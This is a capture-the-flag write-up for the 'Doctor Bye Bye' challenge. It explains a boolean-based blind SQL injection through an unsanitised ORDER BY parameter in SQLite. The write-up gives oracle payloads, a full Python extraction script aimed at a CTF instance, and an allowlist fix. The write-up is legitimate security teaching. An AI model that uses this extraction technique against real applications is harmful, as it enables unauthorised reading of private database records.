# Doctor Bye Bye — Writeup (ORDER BY Blind SQLi)

Oct 11, 2026 · @Demian

## Challenge overview

**Name:** Doctor Bye Bye · **Category:** Web / SQL injection (blind, boolean-based) · **Target:** `https://doctor-bye-bye-95021b4a1a77.inst8.ctf.fortid.com`

> Dr. Bye Bye has retired from St. Codd's Hospital. The hospital insists that retired records can never be displayed. Can you recover Dr. Bye Bye's private farewell note anyway?

The site exposes one JSON endpoint, `/api/on-call`, that picks the next on-call doctor. Its `sort` parameter is concatenated straight into the SQL `ORDER BY` clause with no sanitisation. The flag lives in a hidden doctor record (`id=404`) that is permanently excluded from results by `WHERE listed = 1`, so it can never appear in the response body. But `ORDER BY` accepts arbitrary SQL expressions, including subqueries that read that hidden row. By making the sort order depend on a true/false fact about the hidden flag, and watching which of the five visible doctors comes back under `LIMIT 1`, we build a **boolean oracle** and extract the flag one character at a time.

## Recon and source analysis

The handout ships the full server (`app.py`, a single stdlib HTTP server backed by SQLite). Three things matter.

**1. Where the flag lives.** The database seeds five normal, *listed* doctors plus one hidden row holding the flag:

```python
# five visible doctors, listed = 1
(10, 'ada-pulse',    'Dr. Ada Pulse',    'Cardiology', 'C-101', 1, NULL),
(30, 'max-well',     'Dr. Max Well',     'Radiology',  'R-204', 1, NULL),
(50, 'paige-turner', 'Dr. Paige Turner', 'Neurology',  'N-303', 1, NULL),
(70, 'ella-ment',    'Dr. Ella Ment',    'Pathology',  'P-118', 1, NULL),
(90, 'zoe-last',     'Dr. Zoe Last',     'Emergency',  'E-001', 1, NULL),
# the retired doctor: listed = 0, farewell_note = THE FLAG
(404, 'doctor-bye-bye', 'Dr. Bye Bye', 'Retired', '-', 0, flag)
```

The flag is the `farewell_note` column of `id=404`, and that row has `listed = 0`.

**2. The only query, with an unsanitised `ORDER BY`.** The endpoint builds its SQL with an f-string:

```python
def select_on_call(order_expression):
    query = f"""
        SELECT name, specialty, room
        FROM doctors
        WHERE listed = 1
        ORDER BY {order_expression}
        LIMIT 1
    """
```

`order_expression` comes directly from the `sort` query parameter (default `"name"`). Only its length is checked (`≤ 600`); its contents are never validated or escaped.

**3. The response leaks only three columns of listed doctors.** `SELECT name, specialty, room ... WHERE listed = 1 ... LIMIT 1` means the JSON can only ever contain one of the five visible doctors — never the flag, and never even a boolean we pick. Everything we learn has to come from *which* of the five rows is returned.

## The vulnerability

The hospital's rule — "retired records can never be displayed" — is enforced by `WHERE listed = 1`. That filter is real: no value of `sort` can smuggle the hidden row into the `SELECT`'s output, because the output columns and the row filter are fixed.

The mistake is treating `ORDER BY` as harmless. In SQLite, `ORDER BY` accepts *any* scalar expression, including:

- function calls like `substr(...)`, `unicode(...)`, `length(...)`
- a `CASE WHEN ... THEN ... ELSE ... END` expression
- a **correlated subquery** such as `(SELECT farewell_note FROM doctors WHERE id = 404)`

That last point is the whole game: even though `WHERE listed = 1` hides row 404 from the result set, a subquery *inside the ORDER BY* can still read it. The filter restricts what is returned, not what the sort expression is allowed to look at.

So we can compute a true/false fact about the hidden flag inside `ORDER BY`. We just need to turn that fact into something observable. `LIMIT 1` does exactly that: it returns whichever listed doctor sorts first. If we make the *sort order itself* flip based on our condition, then the identity of the returned doctor becomes a readout of one bit.

## Building the boolean oracle

The five visible doctors have ids `10, 30, 50, 70, 90`. Sort them ascending and the first is Ada Pulse (id 10); sort descending and the first is Zoe Last (id 90). That gives a clean two-state signal we can steer with a `CASE`:

```sql
ORDER BY CASE WHEN (<condition>) THEN id ELSE -id END
```

- condition **true** → effectively `ORDER BY id` (ascending) → `LIMIT 1` returns **id 10, "Dr. Ada Pulse"**
- condition **false** → effectively `ORDER BY -id` (ascending over negatives) → returns **id 90, "Dr. Zoe Last"**

So the rule is simply: **response name `== "Dr. Ada Pulse"` means the condition is TRUE.** Confirmed against a local copy of the service:

```
?sort=CASE WHEN 1 THEN id ELSE -id END   → {"name":"Dr. Ada Pulse", ...}   (true)
?sort=CASE WHEN 0 THEN id ELSE -id END   → {"name":"Dr. Zoe Last",  ...}   (false)
```

Now any yes/no question about the hidden note can be asked by dropping it into `<condition>`, reading the note through a subquery:

```sql
CASE WHEN (SELECT farewell_note FROM doctors WHERE id=404) LIKE 'FortID{%'
     THEN id ELSE -id END
```

## Extraction

With a one-bit oracle, extracting the flag is two phases, each a binary search so the number of requests stays small (`≈ log₂` per answer).

**Phase 1 — find the length.** Ask `length(secret) >= N`, doubling `N` until it goes false to bound the range, then binary-search the exact value.

**Phase 2 — recover each character.** The flag is printable ASCII (codepoints 32–126). For each position, binary-search the codepoint with:

```sql
unicode(substr((SELECT farewell_note FROM doctors WHERE id=404), <pos>, 1)) > <mid>
```

Each comparison is one HTTP request; \~7 requests pin down one character. The full exploit:

```python
#!/usr/bin/env python3
import sys, requests

BASE = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://127.0.0.1:8099"
TRUE_NAME = "Dr. Ada Pulse"
SECRET = "(SELECT farewell_note FROM doctors WHERE id=404)"
sess = requests.Session()

def oracle(cond: str) -> bool:
    expr = f"CASE WHEN ({cond}) THEN id ELSE -id END"
    r = sess.get(f"{BASE}/api/on-call", params={"sort": expr}, timeout=30)
    r.raise_for_status()
    return r.json()["doctor"]["name"] == TRUE_NAME

# 1) length: exponential bound, then binary search
hi = 1
while oracle(f"length({SECRET}) >= {hi}"):
    hi *= 2
lo = hi // 2
while lo < hi:
    mid = (lo + hi + 1) // 2
    if oracle(f"length({SECRET}) >= {mid}"): lo = mid
    else: hi = mid - 1
length = lo

# 2) each character over printable ASCII 32..126
out = []
for pos in range(1, length + 1):
    lo, hi = 32, 126
    while lo < hi:
        mid = (lo + hi) // 2
        if oracle(f"unicode(substr({SECRET},{pos},1)) > {mid}"): lo = mid + 1
        else: hi = mid
    out.append(chr(lo))
print("FLAG:", "".join(out))
```

Run it against the live target from a machine that can reach it:

```bash
pip install requests
python3 solve.py https://doctor-bye-bye-95021b4a1a77.inst8.ctf.fortid.com
```

Against a local rebuild seeded with a known flag it recovered the value exactly, confirming the technique end to end:

```
[+] flag length = 44
[+] FLAG: FortID{test_fake_flag_for_local_repro_12345}
```

## Result and remediation

**Result.** The script returns the `farewell_note` of `id=404` in the form `FortID{...}` — Dr. Bye Bye's private note, recovered despite the record never being displayable. Run the script against the live instance to read the real flag.

**Why the defences failed.** The challenge layered three controls that all look reasonable in isolation: a `WHERE listed = 1` filter, a fixed three-column `SELECT`, and a `LIMIT 1`. None of them govern the `ORDER BY` expression, and that is where untrusted input was interpolated. A subquery in `ORDER BY` reaches past the row filter, and `LIMIT 1` over ordered rows is enough side-channel to leak data one bit at a time.

**Fix.** Never interpolate user input into `ORDER BY`. Map the `sort` parameter to a fixed allowlist of known-safe expressions:

```python
SORTS = {
    "name":      "name ASC",
    "room":      "room ASC",
    "specialty": "specialty ASC",
}
order_expression = SORTS.get(parameters.get("sort", ["name"])[0])
if order_expression is None:
    return error(400, "Invalid schedule preference.")
```

Because the user-supplied string is now only ever a *key* into a dictionary of hard-coded clauses, no attacker-controlled SQL can reach the query. (Parameter binding does not help here — `ORDER BY ?` is not valid for an identifier/expression — which is exactly why an allowlist is the right tool for sort columns.)
